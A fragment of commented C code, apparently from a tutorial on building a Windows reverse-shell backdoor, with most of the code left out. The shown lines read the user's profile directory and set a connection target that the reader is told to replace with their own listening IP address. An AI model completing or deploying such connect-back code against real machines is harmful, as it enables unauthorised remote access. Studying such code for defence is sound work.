...
//? Collecting the path of the current user's directory on the filesystem:
char* userDirectory() /* char* before a functions' name means it will return a pointer to a string */
{
    ...
    pPath = getenv ("USERPROFILE"); /* we use the function getenv that is shipped with the previously included headers (<stdlib.h>) in order to know the user's directory location - in this case, it is kept in an environment variable of the Windows system called "userprofile" */
...
int main() //declaration of the main function
{
    ...
    addr.sin_addr.s_addr = inet_addr("192.168.0.1"); /* specify the target of network connection - replace the ip with your listening ip address */
